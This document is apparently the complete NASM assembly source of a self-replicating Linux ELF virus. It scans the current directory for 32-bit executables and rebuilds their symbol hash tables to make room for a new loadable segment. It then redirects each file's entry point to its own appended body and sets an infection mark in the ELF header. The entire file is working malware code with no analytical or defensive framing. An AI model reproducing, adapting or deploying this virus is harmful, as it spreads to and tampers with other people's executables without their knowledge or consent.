   %include 'inc/macro.inc'
   %include 'inc/system.inc'

   %define SHT_HASH    5
   %define SHT_DYNAMIC 6
   %define PT_NULL     0
   %define PT_LOAD     1
   %define PT_INTERP   3
   %define PT_PHDR     6

   ; variables
   %define old_esp     [ebp + 0]
   %define dirent      [ebp + 4]   ; pointer to the dirent structure
   %define filename    [ebp + 8]   ; guess what?
   %define file_map    [ebp + 12]
   %define file_handle [ebp + 16]
   %define file_length [ebp + 20]
   %define sht     [ebp + 24]
   %define shash       [ebp + 28]
   %define sdyn        [ebp + 32]
   %define dynsym      [ebp + 36]
   %define dynstr      [ebp + 40]
   %define hash        [ebp + 44]
   %define dynamic     [ebp + 48]
   %define old_entry   [ebp + 52]

           BITS    32
           CPU 386
           global  _start
           section .text

   _start:     push    strict dword fake_host
           pusha
           mov ebx, esp
           sub esp, 512
           mov ebp, esp
           lea eax, [esp + 128]
           mov dirent, eax
           mov old_esp, ebx
           lea eax, [eax + 10]
           mov filename, eax

           movb    eax, SYS_open
           mov ebx, filename
           mov word [ebx], 0x2e
           movb    ecx, 0              ; O_RDONLY
           int 0x80                ; open
           or  eax, eax
           js  .exit
           xchg    eax, ebx
   .readdir:   mov ecx, dirent
           movb    eax, SYS_readdir
           int 0x80
           dec eax
           jnz .close
           call    infect
           jmp .readdir
   .close:     movb    eax, SYS_close
           int 0x80
   .exit:      mov esp, old_esp
           popa
           ret

   infect:     pusha
           ; open(filename, 2)
           movb    eax, SYS_open
           mov ebx, filename
           movb    ecx, 2
           int 0x80
           or  eax, eax
           js  return
           mov file_handle, eax
           xchg    eax, ebx
           ; lseek(h, 0, 2)
           movb    eax, SYS_lseek
           movb    ecx, 0
           movb    edx, 2
           int 0x80
           cmp eax, 1024
           jb  close
           mov file_length, eax
           xchg    eax, edx
           ; mmap(NULL,length,PROT_READ|PROT_WRITE,MAP_SHARED,handle,offset)
           push    ebx
           mpush   0, ebx, 1, 3, edx, 0
           movb    eax, SYS_mmap
           mov ebx, esp
           int 0x80
           add esp, byte 24
           cmp eax, 0xfffff000
           pop ebx
           ja  close
           xchg    eax, esi
           mov file_map, esi

           ; Check ELF header
           cmp dword [esi], 0x464c457f     ; ELF file?
           jne unmap
           cmp dword [esi + 16], 0x00030002    ; e_type == ET_EXEC &&
           jne unmap               ; e_machine == EM_386
           cmp byte [esi + 15], 0      ; already infected?
           jne unmap
           mov al, [esi + 7]           ; e_ident[EI_OSABI]
           cmp al, 3               ; Linux?
           je  ok
           cmp al, 0               ; None? ;-)
           je  ok

   unmap:      movb    eax, SYS_munmap
           mov ebx, file_map
           mov ecx, file_length
           int 0x80
   close:      movb    eax, SYS_close
           mov ebx, file_handle
           int 0x80
   return:     popa
           ret

   ok:     xor eax, eax
           mov shash, eax
           mov sdyn, eax
           mov edi, [esi + e_shoff]
           add edi, esi
           mov sht, edi
           movzx   ecx, word [esi + e_shnum]
       .ls:    cmp dword [edi + sh_type], SHT_HASH
           jne .l1
           mov shash, edi
       .l1:    cmp dword [edi + sh_type], SHT_DYNAMIC
           jne .l2
           mov sdyn, edi
       .l2:    add edi, 40
           loop    .ls
           mov eax, shash
           and eax, sdyn
           jz  unmap

           mov eax, sht
           mov ebx, shash
           mov edx, [ebx + sh_offset]
           add edx, esi
           mov hash, edx       ; hash (ptr)
           mov ebx, [ebx + sh_link]
           lea ebx, [ebx * 4 + ebx]
           lea ebx, [eax + ebx * 8]    ; dynsym (ptr)
           mov ecx, [ebx + sh_offset]
           add ecx, esi
           mov dynsym, ecx
           mov ecx, [ebx + sh_link]
           lea ecx, [ecx * 4 + ecx]
           lea ecx, [eax + ecx * 8]    ; dynstr (ptr)
           mov ecx, [ecx + sh_offset]
           add ecx, esi
           mov dynstr, ecx
           mov eax, sdyn
           mov eax, [eax + sh_offset]
           add eax, esi
           mov dynamic, eax

           mov edi, hash
           mov ebx, [edi + 0]      ; nbuckets
           mov edx, [edi + 4]      ; nchains
           cmp ebx, 9
           jb  unmap
           ; clean hash and build new hash
           mov ecx, shash

           mov ecx, [ecx + sh_size]
           xor eax, eax
           cld
           rep stosb
           sub ebx, 8
           push    dword dynstr
           push    dword dynsym
           push    edx
           push    ebx
           push    dword hash
           call    build_hash
   ; move sections
           mov edi, shash
           movb    ebx, 32
           ; fix hash size
           sub [edi + sh_size], ebx

       .ms:    mov eax, [edi + sh_size]
           push    eax
           mov eax, [edi + sh_offset]
           add eax, esi
           push    eax
           add eax, ebx
           push    eax
           call    memmove
               ; fix PHDR
               mov edx, [esi + e_phoff]
               add edx, esi
               movzx   ecx, word [esi + e_phnum]
           .p0:    mov eax, [edx + p_vaddr]
               cmp eax, [edi + sh_addr]
               jne .p1
                   add [edx + p_vaddr], ebx
                   add [edx + p_paddr], ebx
                   add [edx + p_offset], ebx
                   jmp .p2
           .p1:    add edx, ebx
               loop    .p0
               ; fix DYNAMIC
           .p2:    mov edx, dynamic
           .d0:    mov eax, [edx]
               or  eax, eax
               jz  .d2
               mov eax, [edi + sh_addr]
               cmp [edx + 4], eax
               jne .d1
                   add [edx + 4], ebx
           .d1:    add edx, 8
               jmp .d0
           .d2:
           add [edi + sh_addr], ebx
           add [edi + sh_offset], ebx
           sub edi, 40
           cmp edi, sht
           ja  .ms
   ; insert new entry to PHT
           xor ebx, ebx
           dec ebx             ; t
           xor edx, edx            ; u
           mov edi, [esi + e_phoff]
           add edi, esi
           movzx   ecx, word [esi + e_phnum]
       .m0:    mov eax, [edi + p_vaddr]
           or  eax, eax
           jz  .m1
           cmp eax, ebx
           jae .m1
               mov ebx, eax
       .m1:    cmp dword [edi + p_type], PT_LOAD
           jne .m2
               movzx   edx, word [esi + e_phnum]
               sub edx, ecx
       .m2:    cmp dword [edi + p_type], PT_PHDR
           jne .m3
               mov eax, 32
               add [edi + p_filesz], eax
               add [edi + p_memsz], eax
       .m3:    add edi, 32
           loop    .m0

           mov eax, ebx
           not eax
           and eax, edx
           jz  unmap

           inc word [esi + e_phnum]
           mov edi, [esi + e_phoff]
           add edi, esi

           movzx   eax, word [esi + e_phnum]
           sub eax, edx
           dec eax
           shl eax, 5
           push    eax

           inc edx
           shl edx, 5
           lea eax, [edi + edx]
           mov edi, eax        ;ph
           push    eax
           add eax, 32
           push    eax
           call    memmove
           ; fill PHT entry
           mov dword [edi + p_type], PT_LOAD
           mov dword [edi + p_flags], 5    ;PF_R|PF_X
           mov dword [edi + p_align], 0x1000
           mov eax, file_length
           mov dword [edi + p_offset], eax
           mov ecx, _size
           mov dword [edi + p_filesz], ecx
           mov dword [edi + p_memsz], ecx
           sub ebx, 8192
           and eax, 8191
           add ebx, eax
           mov dword [edi + p_vaddr], ebx
           mov dword [edi + p_paddr], ebx
           ; save old entry point and set the new one
           mov eax, [esi + e_entry]
           mov old_entry, eax
           mov [esi + e_entry], ebx
   ; mark file as infected and write body
           inc byte [esi + 15]     ; infection mark

           pusha
           cld
           mov ecx, 4096
           sub esp, ecx
           mov edi, esp
           movb    eax, 0x90
           rep stosb
           mov edi, esp
           mov ecx, _size
           mov esi, strict dword _start
       _self   equ $-_start-4
           rep movsb
           mov eax, old_entry
           mov [esp + 1], eax      ; save old entry
           mov [esp + _self], ebx  ; save new entry
           mov eax, 4
           mov ebx, file_handle
           mov ecx, esp
           mov edx, 4096
           int 0x80            ; write body
           add esp, edx
           popa
           jmp unmap

   elf_hash:   pusha
           cld
           xor eax, eax
           xor edx, edx    ; edx - h
           mov esi, [esp + 36] ; name

       .next:  lodsb
           or  eax, eax
           jz  .done

           shl edx, 4
           add edx, eax

           mov ebx, edx
           and ebx, 0xf0000000
           jz  .skip
           mov ecx, ebx
           shr ecx, 24
           xor edx, ecx
       .skip:
           not ebx
           and edx, ebx

           jmp .next

       .done:  mov [esp + 28], edx
           popa
           retn    4

   build_hash: pusha
           cld
           mov edi, [esp + 36]     ; hash
           mov eax, [esp + 40]     ; nbuckets
           stosd
           xchg    eax, ecx
           mov eax, [esp + 44]     ; nchains
           stosd
           xchg    eax, ebp
           lea esi, [edi + ecx * 4]    ; chains
           xor ebx, ebx
           inc ebx

       .for:   mov eax, [esp + 48]     ; sym
           mov edx, ebx
           shl edx, 4          ; edx = i * sizeof(Elf32_Sym)
           mov eax, [eax + edx]    ; sym[i].st_name
           add eax, [esp + 52]     ; str

           push    eax
           call    elf_hash
           ; eax - h
           xor edx, edx
           div ecx
           ; edx = elf_hash(str + sym[i].st_name) % nbuckets;

           mov eax, [edi + edx * 4]
           or  eax, eax
           jnz .else

               mov [edi + edx * 4], ebx
               jmp .endif

       .else:  mov edx, [edi + edx * 4]

       .while: mov eax, [esi + edx * 4]
           or  eax, eax
           jz  .end_while
           mov edx, [esi + edx * 4]
           jmp .while
       .end_while:
           mov [esi + edx * 4], ebx
       .endif:
           inc ebx
           cmp ebx, ebp
           jb  .for

           popa
           retn    20

   memmove:        pusha
           mov edi, [esp + 36]
           mov esi, [esp + 40]
           mov ecx, [esp + 44]
           mov eax, edi
           sub eax, esi
           cmp eax, ecx
           jb  .down
           cld
           rep movsb
           jmp .done
       .down:  std
           lea esi, [esi + ecx - 1]
           lea edi, [edi + ecx - 1]
           rep movsb
       .done:  popa
           retn    12

   _size       equ $-_start

   fake_host:  mov eax,1
           int 0x80
           section .data
